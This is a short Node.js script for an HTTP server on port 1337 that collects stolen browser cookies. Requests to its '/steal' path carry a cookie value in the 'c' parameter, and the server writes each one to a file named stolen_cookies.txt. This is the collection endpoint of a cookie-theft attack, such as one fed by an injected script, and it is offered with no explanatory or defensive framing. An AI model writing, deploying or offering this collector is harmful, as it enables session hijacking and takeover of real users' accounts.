const http = require('http');
const fs = require('fs');

http.createServer((req, res) => {
    const url = require('url').parse(req.url, true);
    if (url.pathname === '/steal') {
        const log = `Stolen cookie: ${url.query.c}\n`;
        fs.appendFileSync('stolen_cookies.txt', log);
        res.end("OK");
    } else {
        res.end("Nothing here.");
    }
}).listen(1337);

console.log("Listening on http://localhost:1337");
